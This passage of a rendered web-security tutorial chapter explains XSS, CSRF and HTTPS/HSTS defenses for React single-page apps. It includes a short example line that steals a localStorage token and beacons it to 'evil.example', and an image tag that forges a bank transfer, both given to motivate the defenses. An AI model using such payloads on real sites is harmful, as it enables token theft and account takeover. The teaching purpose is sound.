+  <a href="#3-cross-site-request-forgery-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      3️⃣ Cross-Site Request Forgery (CSRF)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3️⃣ Cross-Site Request Forgery (CSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#defense-1-samesite-cookies-your-first-line" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense 1 — SameSite cookies (your first line)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-2-csrf-tokens-synchronizer-token-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense 2 — CSRF tokens (synchronizer token pattern)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-3-double-submit-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense 3 — Double-submit cookie
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-https-hsts" class="md-nav__link">
+    <span class="md-ellipsis">
+      4️⃣ HTTPS &amp; HSTS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-secure-token-storage-trade-offs" class="md-nav__link">
+    <span class="md-ellipsis">
+      5️⃣ Secure Token Storage Trade-offs
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5️⃣ Secure Token Storage Trade-offs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-recommended-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      The recommended pattern
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-cors-a-browser-policy-not-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      6️⃣ CORS — A Browser Policy, Not Authentication
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6️⃣ CORS — A Browser Policy, Not Authentication">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-actually-happens" class="md-nav__link">
+    <span class="md-ellipsis">
+      What actually happens
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-secrets-handling-never-ship-secrets-to-the-client" class="md-nav__link">
+    <span class="md-ellipsis">
+      7️⃣ Secrets Handling — Never Ship Secrets to the Client
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7️⃣ Secrets Handling — Never Ship Secrets to the Client">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#build-time-env-vars-are-embedded-not-hidden" class="md-nav__link">
+    <span class="md-ellipsis">
+      Build-time env vars are embedded, not hidden
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-input-validation-response-validation-zod" class="md-nav__link">
+    <span class="md-ellipsis">
+      8️⃣ Input Validation &amp; Response Validation (Zod)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8️⃣ Input Validation & Response Validation (Zod)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#validating-api-responses-with-zod" class="md-nav__link">
+    <span class="md-ellipsis">
+      Validating API responses with Zod
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-rate-limiting-abuse-the-clients-role" class="md-nav__link">
+    <span class="md-ellipsis">
+      9️⃣ Rate Limiting &amp; Abuse — The Client's Role
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="9️⃣ Rate Limiting & Abuse — The Client's Role">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#be-a-good-client" class="md-nav__link">
+    <span class="md-ellipsis">
+      Be a good client
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#handle-429-correctly-respect-retry-after" class="md-nav__link">
+    <span class="md-ellipsis">
+      Handle 429 correctly (respect Retry-After)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dependency-supply-chain-hygiene" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔟 Dependency &amp; Supply-Chain Hygiene
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-secure-http-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣1️⃣ Secure HTTP Headers
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-logging-pii-concerns" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣2️⃣ Logging &amp; PII Concerns
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#actionable-best-practices-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      ✅ Actionable Best-Practices Checklist
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="api-security-best-practices">API Security &amp; Best Practices</h1>
+<p>Security is not a feature you bolt on at the end — it is a property of how you design data flow, store credentials, and trust input. This chapter covers the <strong>frontend's slice</strong> of API security: what a React/SPA can realistically defend against, what it <strong>cannot</strong> defend against, and the practices that keep you out of trouble.</p>
+<div class="admonition info">
+<p class="admonition-title">Where the frontend fits</p>
+<p>The browser is a <strong>hostile, fully-inspectable environment</strong>. Anything shipped to the client — code, "secrets", validation rules — can be read, modified, and replayed by a determined user. The frontend's job is to protect <em>the user</em> (from XSS, from leaking their data) and to be a well-behaved client. <strong>Authoritative security always lives on the server.</strong> This chapter never asks the client to enforce something the server should.</p>
+</div>
+<p>This chapter builds on <strong><a href="../14.3.Authentication/">14.3 Authentication</a></strong> and keeps the same stance: <strong>HttpOnly-cookie-first</strong> for tokens, and never <code>localStorage</code> for credentials without a loud caveat.</p>
+<hr />
+<h2 id="1-the-browser-threat-model">1️⃣ The Browser Threat Model</h2>
+<p>Before mitigations, know what you are defending against. For a React SPA the realistic threats are:</p>
+<table>
+<thead>
+<tr>
+<th>Threat</th>
+<th>Attacker goal</th>
+<th>Who it hurts</th>
+<th>Frontend can mitigate?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>XSS</strong> (Cross-Site Scripting)</td>
+<td>Run JS in your origin</td>
+<td>Your users</td>
+<td>✔️ Yes — primary frontend job</td>
+</tr>
+<tr>
+<td><strong>CSRF</strong> (Cross-Site Request Forgery)</td>
+<td>Make the browser send authed requests</td>
+<td>Your users</td>
+<td>⚠️ Partly — cookies + tokens</td>
+</tr>
+<tr>
+<td><strong>MITM</strong> (Man-in-the-middle)</td>
+<td>Read/alter traffic</td>
+<td>Your users</td>
+<td>✔️ HTTPS/HSTS</td>
+</tr>
+<tr>
+<td><strong>Credential theft</strong></td>
+<td>Steal tokens/session</td>
+<td>Your users</td>
+<td>✔️ Storage choice</td>
+</tr>
+<tr>
+<td><strong>Secret leakage</strong></td>
+<td>Read API keys in bundle</td>
+<td>You / your bill</td>
+<td>✔️ Don't ship secrets</td>
+</tr>
+<tr>
+<td><strong>Supply-chain</strong></td>
+<td>Malicious npm dependency</td>
+<td>Everyone</td>
+<td>✔️ Audit + lockfiles</td>
+</tr>
+<tr>
+<td><strong>Abuse / scraping / brute force</strong></td>
+<td>Hammer your API</td>
+<td>Your server</td>
+<td>❌ Server-side (frontend can soften UX)</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition danger">
+<p class="admonition-title">The golden rule</p>
+<p><strong>Never trust the client.</strong> A request can come from your React app, from <code>curl</code>, from a modified bundle, or from an attacker replaying captured traffic. Every authorization check, every business rule, every validation that <em>matters</em> must be re-enforced on the server. Client-side checks exist for <strong>UX</strong>, not security.</p>
+</div>
+<h3 id="the-same-origin-mental-model">The "same-origin" mental model</h3>
+<p>The browser groups everything by <strong>origin</strong> = <code>scheme + host + port</code>. Code, cookies, and storage are partitioned by origin. Most browser security (the Same-Origin Policy, cookie scoping, storage isolation) is about keeping origins from reading each other's stuff. XSS is dangerous precisely because it runs <strong>inside your origin</strong>, so it bypasses all of that.</p>
+<hr />
+<h2 id="2-cross-site-scripting-xss">2️⃣ Cross-Site Scripting (XSS)</h2>
+<p>XSS is the single most important threat for an SPA, because <strong>XSS defeats almost every other defense</strong>. If an attacker can run JavaScript in your origin, they can read anything JS can read, call your API as the user, and exfiltrate data.</p>
+<h3 id="how-xss-happens">How XSS happens</h3>
+<p>XSS occurs when untrusted data is rendered as <strong>executable markup/script</strong> instead of inert text.</p>
+<ul>
+<li><strong>Stored XSS</strong> — malicious input saved server-side, then served to others (e.g. a comment containing <code>&lt;script&gt;</code>).</li>
+<li><strong>Reflected XSS</strong> — malicious input echoed straight back into the page (e.g. a search term in the URL).</li>
+<li><strong>DOM-based XSS</strong> — the client itself writes untrusted data into a dangerous sink (<code>innerHTML</code>, <code>eval</code>, <code>dangerouslySetInnerHTML</code>).</li>
+</ul>
+<h3 id="why-react-is-mostly-safe-by-default">Why React is <em>mostly</em> safe by default</h3>
+<p>React <strong>escapes</strong> any string you interpolate into JSX. This is safe:</p>
+<div class="language-jsx highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1">// SAFE — React escapes the string; &lt;script&gt; renders as visible text, not code</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kd">function</span><span class="w"> </span><span class="nx">Comment</span><span class="p">({</span><span class="w"> </span><span class="nx">body</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;{</span><span class="nx">body</span><span class="p">}&lt;/</span><span class="nt">p</span><span class="p">&gt;;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>The escape hatch is where danger lives:</p>
+<div class="language-jsx highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1">// DANGER — bypasses React&#39;s escaping entirely</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="kd">function</span><span class="w"> </span><span class="nx">Article</span><span class="p">({</span><span class="w"> </span><span class="nx">html</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="p">&lt;</span><span class="nt">div</span><span class="w"> </span><span class="na">dangerouslySetInnerHTML</span><span class="o">=</span><span class="p">{{</span><span class="w"> </span><span class="nx">__html</span><span class="o">:</span><span class="w"> </span><span class="nx">html</span><span class="w"> </span><span class="p">}}</span><span class="w"> </span><span class="p">/&gt;;</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="p">}</span>
+</span></code></pre></div>
+<div class="admonition danger">
+<p class="admonition-title"><code>dangerouslySetInnerHTML</code> is named that for a reason</p>
+<p>Only use it on HTML you have <strong>sanitized</strong> or that you fully control. Never feed it raw user input or an unsanitized API response. The same applies to <code>eval</code>, <code>new Function</code>, <code>setTimeout("...string...")</code>, <code>el.innerHTML</code>, <code>el.outerHTML</code>, and <code>document.write</code>.</p>
+</div>
+<h3 id="why-xss-breaks-localstorage-token-storage">Why XSS breaks <code>localStorage</code> token storage</h3>
+<p>This is the crux of the auth stance in <a href="../14.3.Authentication/">14.3</a>. <code>localStorage</code> and <code>sessionStorage</code> are <strong>readable by any JavaScript running on your origin</strong>:</p>
+<div class="language-js highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">// Anything that runs an XSS payload can do exactly this:</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">stolen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">&quot;accessToken&quot;</span><span class="p">);</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nx">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="s2">&quot;https://evil.example/collect&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">stolen</span><span class="p">);</span>
+</span></code></pre></div>
+<p>A token in <code>localStorage</code> is a <strong>bearer token sitting in plaintext, reachable by script</strong>. One XSS bug = full account takeover, and the stolen token works from the attacker's own machine until it expires.</p>
+<div class="admonition warning">
+<p class="admonition-title">The localStorage caveat (do not skip this)</p>
+<p><code>localStorage</code> is convenient but <strong>not appropriate for credentials</strong> (access tokens, refresh tokens, session IDs) unless you fully accept the XSS risk. An <strong>HttpOnly cookie is unreadable by JavaScript</strong>, so even successful XSS cannot exfiltrate the raw token. Prefer HttpOnly cookies; if you must hold an access token in JS, keep it <strong>in memory only</strong> (see §5), never persisted.</p>
+</div>
+<h3 id="xss-mitigations">XSS mitigations</h3>
+<h4 id="1-output-encoding-let-react-do-it">1. Output encoding (let React do it)</h4>
+<p>Render data as text. Avoid the dangerous sinks above. If you never call <code>dangerouslySetInnerHTML</code>, React's automatic escaping handles the bulk of XSS for you.</p>
+<h4 id="2-sanitize-when-you-must-render-html">2. Sanitize when you <em>must</em> render HTML</h4>
+<p>If you genuinely need to render user-authored HTML (rich-text comments, CMS content), sanitize it with a vetted library — <strong>DOMPurify</strong> — and never roll your own regex "sanitizer".</p>
+<div class="language-jsx highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">import</span><span class="w"> </span><span class="nx">DOMPurify</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;dompurify&quot;</span><span class="p">;</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="kd">function</span><span class="w"> </span><span class="nx">RichContent</span><span class="p">({</span><span class="w"> </span><span class="nx">untrustedHtml</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span><span class="c1">// Strips &lt;script&gt;, event handlers (onerror, onclick...), javascript: URLs, etc.</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">clean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">untrustedHtml</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">USE_PROFILES</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">html</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">});</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="p">&lt;</span><span class="nt">div</span><span class="w"> </span><span class="na">dangerouslySetInnerHTML</span><span class="o">=</span><span class="p">{{</span><span class="w"> </span><span class="nx">__html</span><span class="o">:</span><span class="w"> </span><span class="nx">clean</span><span class="w"> </span><span class="p">}}</span><span class="w"> </span><span class="p">/&gt;;</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="p">}</span>
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Watch out for <code>href</code>/<code>src</code> injection</p>
+<p>Sanitizing tags isn't enough. A <code>javascript:</code> URL in an <code>&lt;a href&gt;</code> or a <code>data:</code> URL in an <code>&lt;img src&gt;</code> is also script execution. Validate URL schemes; allow only <code>http</code>, <code>https</code>, <code>mailto</code>, <code>tel</code>.</p>
+<div class="language-jsx highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">SAFE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/^(https?:|mailto:|tel:)/i</span><span class="p">;</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">safeHref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">(</span><span class="nx">SAFE</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;#&quot;</span><span class="p">);</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="p">&lt;</span><span class="nt">a</span><span class="w"> </span><span class="na">href</span><span class="o">=</span><span class="p">{</span><span class="nx">safeHref</span><span class="p">(</span><span class="nx">link</span><span class="p">.</span><span class="nx">url</span><span class="p">)}</span><span class="w"> </span><span class="na">rel</span><span class="o">=</span><span class="s">&quot;noopener noreferrer&quot;</span><span class="p">&gt;{</span><span class="nx">link</span><span class="p">.</span><span class="nx">label</span><span class="p">}&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></code></pre></div>
+</div>
+<h4 id="3-content-security-policy-csp-defense-in-depth">3. Content Security Policy (CSP) — defense in depth</h4>
+<p>A CSP is an HTTP response header that tells the browser which sources of script/style/etc. are allowed. It is a <strong>second line of defense</strong>: even if an attacker injects a <code>&lt;script&gt;</code>, a strict CSP can stop it from executing or from phoning home.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Content-Security-Policy:
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>  default-src &#39;self&#39;;
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>  script-src &#39;self&#39;;
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>  connect-src &#39;self&#39; https://api.example.com;
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>  img-src &#39;self&#39; data: https:;
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>  object-src &#39;none&#39;;
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>  base-uri &#39;self&#39;;
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>  frame-ancestors &#39;none&#39;
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">CSP is a server header, and <code>'unsafe-inline'</code> undermines it</p>
+<p>A CSP must be sent by the <strong>server</strong> (or a strict meta tag for a subset of directives). Avoid <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code> in <code>script-src</code> — they re-open the door XSS walks through. Modern best practice is a <strong>nonce-based</strong> or <strong>hash-based</strong> CSP. Note that some bundler/dev setups inject inline scripts; configure CSP for production builds and test it.</p>
+</div>
+<hr />
+<h2 id="3-cross-site-request-forgery-csrf">3️⃣ Cross-Site Request Forgery (CSRF)</h2>
+<p>CSRF tricks a logged-in user's <strong>browser</strong> into making an authenticated request the user didn't intend — because the browser <strong>automatically attaches cookies</strong> to requests to your domain, regardless of which site initiated them.</p>
+<div class="admonition note">
+<p class="admonition-title">CSRF only matters for <em>ambient</em> credentials</p>
+<p>CSRF exploits credentials the browser sends <strong>automatically</strong>: cookies, HTTP Basic auth, client certs. If you authenticate with an <code>Authorization: Bearer</code> header that JS must add manually, a cross-site form/image <strong>cannot</strong> add that header, so classic CSRF doesn't apply. This is a real trade-off of cookie auth — and the reason cookie auth needs CSRF defenses.</p>
+</div>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cm">&lt;!-- On evil.example, a victim who is logged into bank.example loads this: --&gt;</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://bank.example/api/transfer?to=attacker&amp;amount=1000&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="cm">&lt;!-- The browser attaches bank.example&#39;s session cookie automatically. --&gt;</span>
+</span></code></pre></div>
+<h3 id="defense-1-samesite-cookies-your-first-line">Defense 1 — <code>SameSite</code> cookies (your first line)</h3>
+<p><code>SameSite</code> tells the browser <strong>not to send the cookie on cross-site requests</strong>.</p>
+<div class="language-js highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1">// server</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s2">&quot;token&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">jwt</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">  </span><span class="nx">httpOnly</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">  </span><span class="nx">secure</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">  </span><span class="nx">sameSite</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;strict&quot;</span><span class="p">,</span><span class="w"> </span><span class="c1">// or &quot;lax&quot;</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="p">});</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Cross-site behavior</th>
+<th>Use when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Strict</code></td>
+<td>Cookie never sent cross-site (even top-level navigation)</td>
+<td>Max safety; can break inbound links into authed pages</td>
+</tr>
+<tr>
+<td><code>Lax</code></td>
+<td>Sent on top-level GET navigations, not on cross-site POST/<code>fetch</code></td>
+<td>Sensible default for most apps</td>
+</tr>
+<tr>
+<td><code>None</code></td>
+<td>Always sent — <strong>requires <code>Secure</code></strong></td>
+<td>Cross-origin APIs, embedded widgets</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title"><code>SameSite=None</code> needs <code>Secure</code> and brings back CSRF risk</p>
+<p>If your API is on a different <em>site</em> and you set <code>SameSite=None</code>, the cookie is sent cross-site again — so you <strong>must</strong> add CSRF tokens (below). <code>SameSite</code> is great but is not a complete solution alone: browser defaults vary, and <code>Lax</code> still allows cross-site top-level GETs.</p>
+</div>
+<h3 id="defense-2-csrf-tokens-synchronizer-token-pattern">Defense 2 — CSRF tokens (synchronizer token pattern)</h3>
+<p>The server issues an unpredictable token tied to the session; the client must echo it back in a <strong>header</strong> (which a cross-site attacker cannot set). The attacker can't read the token (Same-Origin Policy), so they can't forge the request.</p>
+<div class="language-jsx highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1">// The CSRF token is delivered in a NON-HttpOnly cookie (readable by JS) or via an endpoint,</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="c1">// then sent back as a header. The SESSION token stays HttpOnly.</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="k">import</span><span class="w"> </span><span class="nx">axios</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;axios&quot;</span><span class="p">;</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c1">// axios has built-in support: read token from a cookie, attach it as a header</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="kd">const</span><span class="w"> </span><span class="nx">api</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">axios</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">  </span><span class="nx">baseURL</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;https://api.example.com&quot;</span><span class="p">,</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">  </span><span class="nx">withCredentials</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">  </span><span class="nx">xsrfCookieName</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;XSRF-TOKEN&quot;</span><span class="p">,</span><span class="w">   </span><span class="c1">// cookie the server sets (JS-readable)</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">  </span><span class="nx">xsrfHeaderName</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;X-XSRF-TOKEN&quot;</span><span class="p">,</span><span class="w"> </span><span class="c1">// header axios echoes back</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="p">});</span>
+</span></code></pre></div>
+<h3 id="defense-3-double-submit-cookie">Defense 3 — Double-submit cookie</h3>
+<p>A stateless variant: the server sets a random value in a (JS-readable) cookie; the client copies it into a request header. The server checks that cookie value === header value. Because cross-site script can't read your cookie or set custom headers on a cross-origin request, the values won't match for a forged request.</p>
+<div class="admonition warning">
+<p class="admonition-title">Don't confuse the two cookies</p>
+<p>With CSRF tokens you end up with <strong>two cookies</strong>: the <strong>HttpOnly session/auth cookie</strong> (the actual credential, JS can't read it) and a <strong>separate, readable CSRF cookie</strong> whose value is echoed in a header. Keeping them distinct is the whole point — and it's why the auth credential stays HttpOnly even when CSRF tokens are in play.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Defense in depth</p>
+<p>Use <code>SameSite=Lax/Strict</code> <strong>and</strong> CSRF tokens for cookie-based sessions. Belt and suspenders is correct here.</p>
+</div>
+<hr />
+<h2 id="4-https-hsts">4️⃣ HTTPS &amp; HSTS</h2>
+<p>Everything above is moot if traffic travels in plaintext — a network attacker can read cookies, steal tokens, and inject scripts.</p>
+<ul>
+<li><strong>HTTPS everywhere.</strong> Encrypts traffic, prevents tampering, and is a prerequisite for <code>Secure</code> cookies, HTTP/2, service workers, and most modern web APIs.</li>
+<li><strong>HSTS</strong> (<code>Strict-Transport-Security</code>) tells browsers to <strong>only ever</strong> use HTTPS for your domain, defeating downgrade and SSL-strip attacks.</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+</span></code></pre></div>
+<div class="admonition danger">
+<p class="admonition-title">Never send credentials over HTTP</p>
+<p>A <code>Secure</code> cookie is only sent over HTTPS — good. But also ensure your app itself is served over HTTPS and redirects HTTP → HTTPS. In production, mixed content (an HTTPS page loading HTTP resources) is blocked by browsers and breaks the page; fix it, don't disable the warning.</p>
+</div>
+<hr />
